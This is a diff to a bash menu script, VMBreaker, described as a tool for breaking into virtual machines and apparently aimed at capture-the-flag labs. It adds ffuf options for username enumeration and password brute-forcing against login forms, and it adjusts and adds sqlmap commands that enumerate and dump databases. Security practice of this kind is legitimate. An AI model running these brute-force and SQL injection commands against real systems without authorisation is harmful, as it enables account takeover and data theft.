@@ -32,7 +32,7 @@
 
 NAMEPROGRAM="VMBreaker (by Kerszi/MindCrafters)"
 DATE="2024-04-03"
-VERSION="0.38a2"
+VERSION="0.38a3"
 DESCRIPTION="This is a program for basic operations to break into a virtual machine."
 # Main variables - if you need before export like: export VARIABLE
 # IP=""
@@ -41,7 +41,6 @@ DESCRIPTION="This is a program for basic operations to break into a virtual mach
 # FILE=""
 # USERNAME=""
 EXTENSIONS="htm,html,jpg,php,txt"
-
 
 # Check programs
 programs=(
@@ -367,7 +366,7 @@ case $selection in
         if [[ -z "${DICTIONARY}" ]]; then  
            dialog --title "Error" --msgbox "The variable DICTIONARY cannot be empty." 10 50; 
            else 
-            COMMAND='ffuf -H "Content-Type: application/x-www-form-urlencoded" -w '"$DICTIONARY"':PARAM -d "username=PARAM" -u http://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"''
+            COMMAND='ffuf -H "Content-Type: application/x-www-form-urlencoded" -w '"$DICTIONARY"':PARAM -d "username=PARAM" -u http://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"' -ac'
             run_program_green_no_exit "$COMMAND"
             ffuf -H "Content-Type: application/x-www-form-urlencoded" -w "$DICTIONARY":PARAM -d "username=PARAM" -u http://$IP:$HTTPPORT$PATH_SUFFIX
             exit            
@@ -377,7 +376,7 @@ case $selection in
         if [[ -z "${USERNAME}" || -z "${DICTIONARY}" ]]; then  
            dialog --title "Error" --msgbox "The variables USERNAME and DICTIONARY cannot be empty." 10 50; 
            else 
-            COMMAND='ffuf -H "Content-Type: application/x-www-form-urlencoded" -w '"$DICTIONARY"':PARAM -d "username='"$USERNAME"'&password=PARAM" -b "cookie here" -u http://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"''
+            COMMAND='ffuf -H "Content-Type: application/x-www-form-urlencoded" -w '"$DICTIONARY"':PARAM -d "username='"$USERNAME"'&password=PARAM" -b "cookie here" -u http://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"' -ac'
             run_program_green_no_exit "$COMMAND"
             ffuf -H "Content-Type: application/x-www-form-urlencoded" -w $DICTIONARY:PARAM -d "username=$USERNAME&password=PARAM" -b "cookie here" -u http://$IP:$HTTPPORT$PATH_SUFFIX
             exit            
@@ -389,11 +388,12 @@ esac
 submenu5() {
     exec 3>&1
     selection=$(dialog \
-        --menu "Choose an action:" 11 50 4 \
+        --menu "Choose an action:" 12 50 6 \
         "A" "Nikto" \
         "B" "Wapiti" \
         "C" "Wpscan (aggressive)" \
         "D" "Sqlmap (all)" \
+        "E" "Sqlmap (REQUESTFILE)" \
         2>&1 1>&3)
     case $selection in
         "A")
@@ -410,9 +410,18 @@ submenu5() {
             run_program_green "$COMMAND"
             ;;
         "D")
-            COMMAND="sqlmap -u http://$IP:$HTTPPORT$PATH_SUFFIX -a --batch --level 5 --risk 3 --forms --dbms=mysql --text-only --exclude-sysdb --threads 10"
+            COMMAND="sqlmap -u http://$IP:$HTTPPORT$PATH_SUFFIX -a --batch --level 3 --risk 1 --forms --dbms=mysql --text-only --exclude-sysdb --threads 10"
             run_program_green "$COMMAND"
-            ;;            
+            ;;
+        "E")
+        if [[ -z "${FILE+x}" ]]; then  
+           dialog --title "Error" --msgbox "The variable FILE cannot be empty.\n\
+export FILE=[Name of file]" 10 50; 
+        else
+            COMMAND="sqlmap -r $FILE --threads 10 --batch --dbs"                        
+            run_program_green "$COMMAND"
+        fi
+            ;;                        
     esac
 }
 
